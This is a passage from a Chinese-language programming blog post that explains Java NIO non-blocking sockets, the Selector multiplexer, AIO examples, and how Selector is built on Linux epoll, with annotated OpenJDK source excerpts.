       <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sc.read(byteBuffer);</span><br><span class="line">                <span class="comment">// 如果有数据，把数据打印出来</span></span><br><span class="line">                <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;接收到消息：&quot;</span></span><br><span class="line">                                       + <span class="keyword">new</span> <span class="title class_">String</span>(byteBuffer.array(),<span class="number">0</span>,len));</span><br><span class="line">                <span class="comment">// 如果客户端断开，把socket从集合中去掉</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == -<span class="number">1</span>) &#123; </span><br><span class="line">                    iterator.remove();</span><br><span class="line">                    System.out.println(<span class="string">&quot;客户端断开连接&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到上面的代码中，<code>accept</code>等待连接和<code>read</code>读取数据的方法都可以设置为非阻塞，那么这样就可以实现一个线程不阻塞地处理多个请求的连接和数据读取事件。</p>
<p>但是按照上面地方式，如果连接数太多的话，会有大量的无效遍历。假如有10000个连接，其中只有100个连接有写数据，但是由于其他9900个连接并没有断开，我们还是要每次轮询遍历10000次，其中有99%的遍历都是无效的，这显然不是一个让人很满意的状态。那么如何解决？</p>
<h3 id="引入多路复用器"><a href="#引入多路复用器" class="headerlink" title="引入多路复用器"></a>引入多路复用器</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NioSelectorServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建NIO ServerSocketChannel</span></span><br><span class="line">        <span class="type">ServerSocketChannel</span> <span class="variable">serverSocket</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">        <span class="comment">// 绑定端口</span></span><br><span class="line">        serverSocket.socket().bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">9000</span>));</span><br><span class="line">        <span class="comment">// 设置ServerSocketChannel为非阻塞</span></span><br><span class="line">        serverSocket.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// 创建Selector多路复用器</span></span><br><span class="line">        <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">        <span class="comment">// 把ServerSocketChannel注册到selector上</span></span><br><span class="line">        <span class="comment">// 并且设置对客户端连接事件感兴趣</span></span><br><span class="line">        serverSocket.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">        System.out.println(<span class="string">&quot;服务启动成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 阻塞等待需要处理的事件发生</span></span><br><span class="line">            selector.select();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取selector中注册的全部事件的SelectionKey实例</span></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            Iterator&lt;SelectionKey&gt; iterator = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历SelectionKeys对事件进行处理</span></span><br><span class="line">            <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">                <span class="comment">// 如果是OP_ACCEPT事件，则说明是客户端连接事件</span></span><br><span class="line">                <span class="keyword">if</span> (key.isAcceptable()) &#123;</span><br><span class="line">                    <span class="comment">// 获取客户端ServerSocketChannel</span></span><br><span class="line">                    <span class="type">ServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> server.accept();</span><br><span class="line">                    socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    <span class="comment">// 将客户端连接也注册到Selector上，并且对读事件感兴趣</span></span><br><span class="line">                    <span class="comment">// 这里的读事件是相对于服务端来说的，而不是客户端读数据</span></span><br><span class="line">                    socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    System.out.println(<span class="string">&quot;客户端连接成功&quot;</span>);</span><br><span class="line">                <span class="comment">// 如果是OP_READ事件，则说明客户端发来数据</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;  </span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> socketChannel.read(byteBuffer);</span><br><span class="line">                    <span class="comment">// 如果有数据，把数据打印出来</span></span><br><span class="line">                    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;接收到消息：&quot;</span></span><br><span class="line">                                           + <span class="keyword">new</span> <span class="title class_">String</span>(byteBuffer.array(),<span class="number">0</span>,len));</span><br><span class="line">                    <span class="comment">// 如果客户端断开连接，关闭连接    </span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == -<span class="number">1</span>) &#123; </span><br><span class="line">                        System.out.println(<span class="string">&quot;客户端断开连接&quot;</span>);</span><br><span class="line">                        socketChannel.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 从事件集合里删除本次处理的key，防止下次重复处理</span></span><br><span class="line">                iterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，引入了多路复用器Selector后，所有的SocketChannel（包括服务端）都会注册到Selector上，通过Selector的<code>select</code>方法就可以获取到所有注册过的SocketChannel发生的所有事件，然后对这些事件处理即可：</p>
<p>也就是我们不是遍历，而是客户端发请求过来 我这边会把它的信息注册到selector实例中</p>
<p><a href="https://i.loli.net/2021/02/24/aCHfO2JevAmzw6K.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/24/aCHfO2JevAmzw6K.png"
                      alt="nio1.png"
                ></a></p>
<p>这样就省略了对所有连接的遍历，只需要处理发生的事件即可，效率大大提高。那这个多路复用器是如何实现的？我们后面介绍。</p>
<h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><p>JDK 7 引入了 Asynchronous IO，即 AIO。AIO是一种异步非阻塞的IO方式， 由操作系统完成后回调通知服务端程序启动线程去处理， 一般适用于连接数较多且连接时间较长的应用。看一个简单的案例：</p>
<ul>
<li>服务端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AIOServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建AsynchronousServerSocketChannel对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">AsynchronousServerSocketChannel</span> <span class="variable">serverChannel</span> <span class="operator">=</span></span><br><span class="line">                AsynchronousServerSocketChannel.open().bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">9000</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过accept方法异步获取连接</span></span><br><span class="line">        serverChannel.accept(<span class="literal">null</span>, </span><br><span class="line">                             <span class="comment">// 传入一个回调</span></span><br><span class="line">                             <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, Object&gt;() &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果成功获取到连接，AIO会回调这个方法</span></span><br><span class="line">            <span class="comment">// 并且直接将连接AsynchronousSocketChannel放在了参数中，无须手动获取</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(AsynchronousSocketChannel socketChannel, </span></span><br><span class="line"><span class="params">                                  Object attachment)</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 再此接收客户端连接，如果不写这行代码后面的客户端连接连不上服务端</span></span><br><span class="line">                    serverChannel.accept(attachment, <span class="built_in">this</span>);</span><br><span class="line">                    System.out.println(socketChannel.getRemoteAddress());</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 通过read方法读取数据，同样是异步的</span></span><br><span class="line">                    socketChannel.read(buffer, </span><br><span class="line">                                       buffer,</span><br><span class="line">                                       <span class="comment">// 传入一个回调</span></span><br><span class="line">                                       <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, ByteBuffer buffer)</span> &#123;</span><br><span class="line">                            <span class="comment">// 需要手动调用flip方法</span></span><br><span class="line">                            <span class="comment">// 将ByteBuffer从写模式变成读模式</span></span><br><span class="line">                            buffer.flip();</span><br><span class="line">                            <span class="comment">// 读取数据</span></span><br><span class="line">                            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(buffer.array(), <span class="number">0</span>, result));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer buffer)</span> &#123;</span><br><span class="line">                            exc.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 失败回调</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Object attachment)</span> &#123;</span><br><span class="line">                exc.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Thread.sleep(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>客户端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AIOClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String... args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建AsynchronousSocketChannel</span></span><br><span class="line">        <span class="type">AsynchronousSocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> AsynchronousSocketChannel.open();</span><br><span class="line">        <span class="comment">// 这里的连接也是异步的，通过get阻塞等待连接完成</span></span><br><span class="line">        socketChannel.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9000</span>)).get();</span><br><span class="line">        <span class="comment">// 写数据</span></span><br><span class="line">        socketChannel.write(ByteBuffer.wrap(<span class="string">&quot;HelloServer&quot;</span>.getBytes()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>BIO、 NIO、 AIO 对比：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/24/Rb63yBfrlZKVWGP.png"
                      alt="nio2.jpg"
                ></p>
<p><strong>为什么Netty使用NIO而不是AIO？</strong></p>
<p>在Linux系统上，AIO的底层实现仍使用Epoll，没有很好实现AIO，因此在性能上没有明显的优势，而且被JDK封装了一层不容易深度优化，Linux上AIO还不够成熟。Netty是<strong>异步非阻塞</strong>框架，Netty在NIO上做了很多异步的封装。</p>
<h1 id="多路复用器的原理"><a href="#多路复用器的原理" class="headerlink" title="多路复用器的原理"></a>多路复用器的原理</h1><p>NIO中的多路复用器Selector是如何实现的？它是如何做到只保存事件的？</p>
<h2 id="Epoll简介"><a href="#Epoll简介" class="headerlink" title="Epoll简介"></a>Epoll简介</h2><blockquote>
<p>本文仅针对Linux系统，因为服务几乎都是部署在Linux上的。对于多路复用器来说，Window、Mac、Linux底层的实现各不相同。</p>
</blockquote>
<p>Selector底层的实现为Linux中的<code>epoll</code>，其实Selector就是对<code>epoll</code>的封装。</p>
<p><code>epoll</code> 是Linux内核中的一种可扩展IO事件处理机制，最早在 Linux 2.5.44 内核中引入，可被用于代替select和poll系统调用，并且在具有大量应用程序请求时能够获得较好的性能（此时被监视的文件描述符数目非常大，与旧的 select 和 poll 系统调用完成操作所需<code>O(n)</code>不同， <code>epoll</code>能在<code>O(1)</code>时间内完成操作，所以性能相当高），<code>epoll</code>向用户空间提供了自己的文件描述符来进行操作。</p>
<p><code>epoll</code>是Linux内核为处理大批量文件描述符而作了改进的poll，是Linux下多路复用IO接口select&#x2F;poll的增强版本，它能显著提高程序在大量并发连接中只有少量活跃的情况下的系统CPU利用率。</p>
<p>另一点原因就是**<code>epoll</code>获取事件的时候，它无须遍历整个被侦听的描述符集，只要遍历那些被内核IO事件异步唤醒而加入Ready队列的描述符集合就行了**。</p>
<table>
<thead>
<tr>
<th></th>
<th>select</th>
<th>poll</th>
<th>epoll(jdk 1.5及以上)</th>
</tr>
</thead>
<tbody><tr>
<td>操作方式</td>
<td>遍历</td>
<td>遍历</td>
<td>回调</td>
</tr>
<tr>
<td>底层实现</td>
<td>数组</td>
<td>链表</td>
<td>哈希表&lt;key,value&gt;</td>
</tr>
<tr>
<td>IO效率</td>
<td>每次调用都进行线性遍历，时间复杂度为O(n)</td>
<td>每次调用都进行线性遍历，时间复杂度为O(n)</td>
<td>事件通知方式，每当有IO事件就绪，系统注册的回调函数就会被调用，时间复杂度O(1)</td>
</tr>
<tr>
<td>最大连接</td>
<td>有上限</td>
<td>无上限</td>
<td>无上限</td>
</tr>
</tbody></table>
<h2 id="Selector源码分析"><a href="#Selector源码分析" class="headerlink" title="Selector源码分析"></a>Selector源码分析</h2><p>Selector的三个重要方法为<code>open</code>，<code>register</code>和<code>select</code>。我们一个一个分析</p>
<h3 id="open方法"><a href="#open方法" class="headerlink" title="open方法"></a>open方法</h3><p>Selector的<code>open</code>方法创建Selector：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Selector <span class="title function_">open</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 先调用SelectorProvider的provider方法获取一个SelectorProvider</span></span><br><span class="line">    <span class="comment">// 再通过SelectorProvider获取Selctor</span></span><br><span class="line">    <span class="keyword">return</span> SelectorProvider.provider().openSelector();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SelectorProvider的<code>provider</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SelectorProvider <span class="title function_">provider</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (provider != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> provider;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;SelectorProvider&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> SelectorProvider <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (loadProviderFromProperty())</span><br><span class="line">                            <span class="keyword">return</span> provider;</span><br><span class="line">                        <span class="keyword">if</span> (loadProviderAsService())</span><br><span class="line">                            <span class="keyword">return</span> provider;</span><br><span class="line">                        <span class="comment">// 这里最终调用DefaultSelectorProvider的create方法</span></span><br><span class="line">                        <span class="comment">// 创建一个SelectorProvider</span></span><br><span class="line">                        provider = sun.nio.ch.DefaultSelectorProvider.create();</span><br><span class="line">                        <span class="keyword">return</span> provider;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DefaultSelectorProvider的<code>create</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SelectorProvider <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Windows下返回的是WindowsSelectorProvider</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WindowsSelectorProvider</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里，由于现在使用的是Windows系统，所以实现类是WindowsSelectorProvider。我们到OpenJDK的源码里面找到Linux系统下的实现类<strong>EPollSelectorProvider</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EPollSelectorProvider</span> <span class="keyword">extends</span> <span class="title class_">SelectorProviderImpl</span> &#123;</span><br><span class="line">    <span class="comment">// 获取Selector</span></span><br><span class="line">    <span class="keyword">public</span> AbstractSelector <span class="title function_">openSelector</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 返回EPollSelectorImpl对象，它就Linux中Selector的实现类</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EPollSelectorImpl</span>(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Linux系统下，Selector的实现类为EPollSelectorImpl：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造方法</span></span><br><span class="line">EPollSelectorImpl(SelectorProvider sp) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>(sp);</span><br><span class="line">    <span class="type">long</span> <span class="variable">pipeFds</span> <span class="operator">=</span> IOUtil.makePipe(<span class="literal">false</span>);</span><br><span class="line">    fd0 = (<span class="type">int</span>) (pipeFds &gt;&gt;&gt; <span class="number">32</span>);</span><br><span class="line">    fd1 = (<span class="type">int</span>) pipeFds;</span><br><span class="line">    <span class="comment">// 创建EPollArrayWrapper对象</span></span><br><span class="line">    pollWrapper = <span class="keyword">new</span> <span class="title class_">EPollArrayWrapper</span>();</span><br><span class="line">    pollWrapper.initInterrupt(fd0, fd1);</span><br><span class="line">    fdToKey = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着又创建了EPollArrayWrapper对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">EPollArrayWrapper() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 调用epollCreate方法</span></span><br><span class="line">    epfd = epollCreate();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the epoll_event array passed to epoll_wait</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">allocationSize</span> <span class="operator">=</span> NUM_EPOLLEVENTS * SIZE_EPOLLEVENT;</span><br><span class="line">    pollArray = <span class="keyword">new</span> <span class="title class_">AllocatedNativeObject</span>(allocationSize, <span class="literal">true</span>);</span><br><span class="line">    pollArrayAddress = pollArray.address();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// eventHigh needed when using file descriptors &gt; 64k</span></span><br><span class="line">    <span class="keyword">if</span> (OPEN_MAX &gt; MAX_UPDATE_ARRAY_SIZE)</span><br><span class="line">        eventsHigh = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">epollCreate</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p>然后调用了一个<code>epollCreate</code>方法，它是一个native方法，我们接着找到它的C语言实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_sun_nio_ch_EPollArrayWrapper_epollCreate</span><span class="params">(JNIEnv *env, jobject <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="comment">// 调用linux的epoll_create函数得到一个文件描述符epfd</span></span><br><span class="line">     <span class="comment">// 通过epfd可以找到linux中的该epoll对象</span></span><br><span class="line">    <span class="type">int</span> epfd = <span class="built_in">epoll_create</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">if</span> (epfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="built_in">JNU_ThrowIOExceptionWithLastError</span>(env, <span class="string">&quot;epoll_create failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> epfd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终调用了Linux系统函数<code>epoll_create</code>，返回了一个文件描述符（Linux中一切皆文件）。</p>
<h4 id="epoll-create函数"><a href="#epoll-create函数" class="headerlink" title="epoll_create函数"></a>epoll_create函数</h4><p><code>epoll_create</code>是Linux系统函数，它的作用是创建一个epoll实例，并返回一个非负数作为文件描述符，用于对epoll接口的所有后续调用。</p>
<p>参数size代表可能会容纳size个描述符，但size不是一个最大值，只是提示操作系统它的数量级，现在这个参数基本上已经弃用了。</p>
<h3 id="register方法"><a href="#register方法" class="headerlink" title="register方法"></a>register方法</h3><p>第二个方法就是将连接通道注册到Selector上，SelectableChannel的<code>register</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> SelectionKey <span class="title function_">register</span><span class="params">(Selector sel, <span class="type">int</span> ops)</span> <span class="keyword">throws</span> ClosedChannelException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 调用子类AbstractSelectableChannel的register方法</span></span><br><span class="line">    <span class="keyword">return</span> register(sel, ops, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AbstractSelectableChannel的<code>register</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> SelectionKey <span class="title function_">register</span><span class="params">(Selector sel,</span></span><br><span class="line"><span class="params">                                   <span class="type">int</span> ops,</span></span><br><span class="line"><span class="params">                                   Object att)</span> <span class="keyword">throws</span> ClosedChannelException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (regLock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isOpen())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClosedChannelException</span>();</span><br><span class="line">        <span class="keyword">if</span> ((ops &amp; ~validOps()) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        <span class="keyword">if</span> (blocking)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalBlockingModeException</span>();</span><br><span class="line">        <span class="type">SelectionKey</span> <span class="variable">k</span> <span class="operator">=</span> findKey(sel);</span><br><span class="line">        <span class="keyword">if</span> (k != <span class="literal">null</span>) &#123;</span><br><span class="line">            k.interestOps(ops);</span><br><span class="line">            k.attach(att);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// New registration</span></span><br><span class="line">            <span class="keyword">synchronized</span> (keyLock) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!isOpen())</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClosedChannelException</span>();</span><br><span class="line">                <span class="comment">// 调用SelectorImpl的register方法</span></span><br><span class="line">                k = ((AbstractSelector)sel).register(<span class="built_in">this</span>, ops, att);</span><br><span class="line">                addKey(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用SelectorImpl的<code>register</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> SelectionKey <span class="title function_">register</span><span class="params">(AbstractSelectableChannel var1, <span class="type">int</span> var2, Object var3)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(var1 <span class="keyword">instanceof</span> SelChImpl)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalSelectorException</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 创建SelectionKey</span></span><br><span class="line">        <span class="type">SelectionKeyImpl</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SelectionKeyImpl</span>((SelChImpl)var1, <span class="built_in">this</span>);</span><br><span class="line">        var4.attach(var3);</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>.publicKeys) &#123;</span><br><span class="line">            <span class="comment">// 调用implRegister方法注册SelectionKey</span></span><br><span class="line">            <span class="comment">// Linux中调用的是EPollSelectorImpl的implRegister方法</span></span><br><span class="line">            <span class="built_in">this</span>.implRegister(var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var4.interestOps(var2);</span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EPollSelectorImpl的<code>implRegister</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">implRegister</span><span class="params">(SelectionKeyImpl ski)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (closed)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClosedSelectorException</span>();</span><br><span class="line">    <span class="type">SelChImpl</span> <span class="variable">ch</span> <span class="operator">=</span> ski.channel;</span><br><span class="line">    <span class="type">int</span> <span class="variable">fd</span> <span class="operator">=</span> Integer.valueOf(ch.getFDVal());</span><br><span class="line">    fdToKey.put(fd, ski);</span><br><span class="line">    <span class="comment">// 这个fd就是SocketChannel</span></span><br><span class="line">    <span class="comment">// 调用EPollArrayWrapper的add方法将该SocketChannel保存起来</span></span><br><span class="line">    pollWrapper.add(fd);</span><br><span class="line">    keys.add(ski);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面就不接着看了，<code>register</code>方法其实还没有真正将SocketChannel和多路复用器进行绑定，而是先将SocketChannel保存起来。</p>
<h3 id="select方法"><a href="#select方法" class="headerlink" title="select方法"></a>select方法</h3><p>最后就是Selector的<code>select</code>方法，在Linux系统下，会调用EPollSelectorImpl的<code>doSelect</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">doSelect</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (closed)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClosedSelectorException</span>();</span><br><span class="line">    processDeregisterQueue();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        begin();</span><br><span class="line">        <span class="comment">// 调用EPollArrayWrapper的poll方法</span></span><br><span class="line">        pollWrapper.poll(timeout);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        end();</span><br><span class="line">    &#125;</span><br><span class="line">    processDeregisterQueue();</span><br><span class="line">    <span class="type">int</span> <span class="variable">numKeysUpdated</span> <span class="operator">=</span> updateSelectedKeys();</span><br><span class="line">    <span class="keyword">if</span> (pollWrapper.interrupted()) &#123;</span><br><span class="line">        <span class="comment">// Clear the wakeup pipe</span></span><br><span class="line">        pollWrapper.putEventOps(pollWrapper.interruptedIndex(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">synchronized</span> (interruptLock) &#123;</span><br><span class="line">            pollWrapper.clearInterrupted();</span><br><span class="line">            IOUtil.drain(fd0);</span><br><span class="line">            interruptTriggered = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   